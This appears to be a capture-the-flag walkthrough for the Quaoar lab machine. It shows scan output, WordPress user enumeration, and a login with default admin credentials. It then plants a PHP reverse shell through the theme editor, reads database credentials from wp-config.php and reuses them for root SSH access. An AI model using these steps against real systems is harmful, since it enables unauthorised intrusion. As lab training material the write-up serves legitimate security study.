# ctf-Quaorar
Opening with NMAP :
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
53/tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid: 
|_  bind.version: 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3?
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2017-10-16T05:14:13+00:00; 0s from scanner time.
995/tcp open  ssl/pop3s?
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
MAC Address: 08:00:27:77:97:F9 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

and one dirb //dirb http://192.168.1.96/   /home/boax/Téléchargements/common.txt


Entering directory: http://192.168.1.96/wordpress/ ----
==> DIRECTORY: http://192.168.1.96/wordpress/index/                            
+ http://192.168.1.96/wordpress/index.php (CODE:301|SIZE:0)                    
+ http://192.168.1.96/wordpress/license (CODE:200|SIZE:19930)                  
+ http://192.168.1.96/wordpress/readme (CODE:200|SIZE:7195)                    
==> DIRECTORY: http://192.168.1.96/wordpress/wp-admin/                         
+ http://192.168.1.96/wordpress/wp-blog-header (CODE:200|SIZE:0)               
+ http://192.168.1.96/wordpress/wp-config (CODE:200|SIZE:0)                    
==> DIRECTORY: http://192.168.1.96/wordpress/wp-content/                       
+ http://192.168.1.96/wordpress/wp-cron (CODE:200|SIZE:0)                      
==> DIRECTORY: http://192.168.1.96/wordpress/wp-includes/                      
+ http://192.168.1.96/wordpress/wp-links-opml (CODE:200|SIZE:217)              
+ http://192.168.1.96/wordpress/wp-load (CODE:200|SIZE:0)                      
+ http://192.168.1.96/wordpress/wp-login (CODE:200|SIZE:2530)                  
+ http://192.168.1.96/wordpress/wp-mail (CODE:500|SIZE:3011)                   
+ http://192.168.1.96/wordpress/wp-settings (CODE:500|SIZE:0)                  
+ http://192.168.1.96/wordpress/wp-signup (CODE:302|SIZE:0)                    
+ http://192.168.1.96/wordpress/wp-trackback (CODE:200|SIZE:135)               
+ http://192.168.1.96/wordpress/xmlrpc (CODE:200|SIZE:42)                      
+ http://192.168.1.96/wordpress/xmlrpc.php (CODE:200|SIZE:42)     


Site based on wordpress !

wpscan attack /

ruby wpscan.rb -u http://192.168.1.23/wordpress --enumerate u
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.4-dev
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.1.96/wordpress/
[+] Started: Thu Oct 19 20:14:14 2017

[+] Enumerating usernames ...
[+] Identified the following 2 user/s:
    +----+--------+--------+
    | Id | Login  | Name   |
    +----+--------+--------+
    | 1  | admin  | admin  |
    | 2  | wpuser | wpuser |
    +----+--------+--------+
 
 Log on http://192.168.1.96/wordpress/wp-login.php?loggedout=true
with admin/admin .

Then , on the dashboard , on Apparence / Editor / Header , we can put a reverseShell  ( http://pentestmonkey.net/tools/web-shells/php-reverse-shell ) . Set up with ur IP and with for example the port 4444 open .

So listen on 4444 :
which python
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@Quaoar:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@Quaoar:/$ ls -lat
ls -lat
total 85
drwxr-xr-x  15 root root  4000 Oct 19  2017 dev
drwxr-xr-x 117 root root  4096 Oct 19  2017 etc
drwxr-xr-x  13 root root     0 Oct 19  2017 sys
drwxrwxrwt   3 root root  4096 Oct 19 14:23 tmp
drwxr-xr-x  24 root root   780 Oct 19 14:12 run
dr-xr-xr-x 107 root root     0 Oct 19 14:12 proc
drwxr-xr-x  13 root root  4096 Jan 15  2017 var
drwx------   6 root root  4096 Nov 30  2016 root
drwxr-xr-x   4 root root  1024 Oct 28  2016 boot
drwxr-xr-x   2 root root  4096 Oct 28  2016 sbin
drwxr-xr-x   3 root root  4096 Oct 24  2016 home
drwxr-xr-x  22 root root  4096 Oct  7  2016 .
drwxr-xr-x  22 root root  4096 Oct  7  2016 ..
-rw-------   1 root root  1024 Oct  7  2016 .rnd
drwxr-xr-x  21 root root  4096 Oct  7  2016 lib
drwxr-xr-x   2 root root  4096 Oct  7  2016 bin
lrwxrwxrwx   1 root root    33 Oct  7  2016 vmlinuz -> boot/vmlinuz-3.2.0-23-generic-pae
lrwxrwxrwx   1 root root    37 Oct  7  2016 initrd.img -> /boot/initrd.img-3.2.0-23-generic-pae
drwxr-xr-x   3 root root  4096 Oct  7  2016 media
drwxr-xr-x  10 root root  4096 Oct  7  2016 usr
drwxr-xr-x   2 root root  4096 Oct  7  2016 opt
drwxr-xr-x   2 root root  4096 Oct  7  2016 srv
drwx------   2 root root 16384 Oct  7  2016 lost+found
drwxr-xr-x   2 root root  4096 Apr 19  2012 mnt
drwxr-xr-x   2 root root  4096 Mar  5  2012 selinux

further ...

cd home
www-data@Quaoar:/home$ ls
ls
wpadmin
www-data@Quaoar:/home$ cd wpadmin
cd wpadmin
www-data@Quaoar:/home/wpadmin$ ls
ls
flag.txt
www-data@Quaoar:/home/wpadmin$ cat flag.txt
cat flag.txt
2bafe61f03117ac66a73c3c514de796e

The flag1 !!!

So , lets continue :

 cd var
cd var
www-data@Quaoar:/var$ ls
ls
backups  cache	crash  lib  local  lock  log  mail  opt  run  spool  tmp  www
www-data@Quaoar:/var$ cd www
cd www
www-data@Quaoar:/var/www$ ls
ls
CHANGELOG			hack-planet-high-definition-mobile.jpg
COPYING				hacker-manifesto-ethical.jpg
Hack_The_Planet.jpg		hacking.jpg
Hack_The_Planet2.jpg		hsperfdata_tomcat6
Hack_The_Planet3.jpg		index.html
INSTALL				pososibo-ethical-hacking-hack-fond.jpg
LICENSE				robots.txt
Quaoar.jpg			tomcat6-tomcat6-tmp
README.md			upload
hack-planet-1280-amox-zone.jpg	wordpress
www-data@Quaoar:/var/www$ cd wordpress 
cd wordpress
www-data@Quaoar:/var/www/wordpress$ ls
ls
index.php	 wp-blog-header.php    wp-cron.php	  wp-mail.php
license.txt	 wp-comments-post.php  wp-includes	  wp-settings.php
readme.html	 wp-config-sample.php  wp-links-opml.php  wp-signup.php
wp-activate.php  wp-config.php	       wp-load.php	  wp-trackback.php
wp-admin	 wp-content	       wp-login.php	  xmlrpc.php

and cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, WordPress Language, and ABSPATH. You can find more information
 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'rootpassword!');

give credentials for ssh connection (root / rootpassword! ) :


ssh root@192.168.1.23
The authenticity of host '192.168.1.96 (192.168.1.23)' can't be established.
ECDSA key fingerprint is SHA256:+ODdJgfptUyyVzKI9wDm804SlXxzmb4/BiKsHCnHGeg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.23' (ECDSA) to the list of known hosts.
root@192.168.1.23's password: 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Thu Oct 19 14:36:35 EDT 2017

  System load:  0.0               Processes:             102
  Usage of /:   29.8% of 7.21GB   Users logged in:       0
  Memory usage: 55%               IP address for eth0:   192.168.1.23
  Swap usage:   0%                IP address for virbr0: 192.168.122.1

  Graph this data and manage this system at https://landscape.canonical.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sun Jan 15 11:23:45 2017 from desktop-g0lhb7o.snolet.com
root@Quaoar:~# id
uid=0(root) gid=0(root) groups=0(root)

and :ls -lat
total 48
-rw-------  1 root root  368 Jan 15  2017 .bash_history
drwx------  6 root root 4096 Nov 30  2016 .
-rw-------  1 root root 4740 Nov 30  2016 .viminfo
drwx------  2 root root 4096 Oct 26  2016 .ssh
----------  1 root root   33 Oct 22  2016 flag.txt
drwx------  2 root root 4096 Oct 15  2016 .cache
drwxr-xr-x 22 root root 4096 Oct  7  2016 ..
drwx------  2 root root 4096 Oct  7  2016 .aptitude
drwxr-xr-x  8 root root 4096 Jan 29  2015 vmware-tools-distrib
-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
-rw-r--r--  1 root root  140 Apr 19  2012 .profile

the last flag :

cat flag.txt   

the flag2 :e3f9ec016e3598c5eec11fd3d73f6fb


TY ! 










